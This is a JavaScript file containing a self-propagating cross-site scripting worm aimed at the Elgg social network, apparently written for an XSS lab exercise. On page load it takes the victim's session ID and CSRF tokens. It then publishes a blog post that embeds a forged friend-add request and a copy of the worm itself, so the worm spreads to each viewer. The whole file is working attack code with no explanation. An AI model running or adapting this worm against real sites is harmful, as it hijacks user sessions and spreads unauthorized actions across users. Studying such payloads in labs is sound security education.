window.onload = function() {
  var guid = "&guid=&container_guid".concat(elgg.session.user.guid);
  var ts = "&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
  var token = "&__elgg_token=".concat(elgg.security.token.__elgg_token);
  var title = "&title=My Awesome Blog";
  var accesslevel = "&access_id=2";
  var status = "&status=published";
  var save = "&save=Save";
  var code = document.getElementById("id1").innerHTML;
  var description = "&description=".concat(
    escape(
      "<img src="
        .concat(
          "http://www.xsslabelgg.com/action/friends/add?friend=47"
            .concat("&__elgg_ts=".concat(elgg.security.token.__elgg_ts))
            .concat("&__elgg_token=".concat(elgg.security.token.__elgg_token))
            .concat(" > ")
        )
        .concat('<script id="id1" type="text/javascript">')
        .concat(code)
        .concat("</".concat("script > "))
    )
  );
  var content = token
    .concat(ts)
    .concat(title)
    .concat(description)
    .concat(accesslevel)
    .concat(status)
    .concat(guid)
    .concat(save);
  alert(content);
  var sendurl = "http://www.xsslabelgg.com/action/blog/save";
  var Ajax = null;
  Ajax = new XMLHttpRequest();
  Ajax.open("POST", sendurl, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  Ajax.send(content);
};
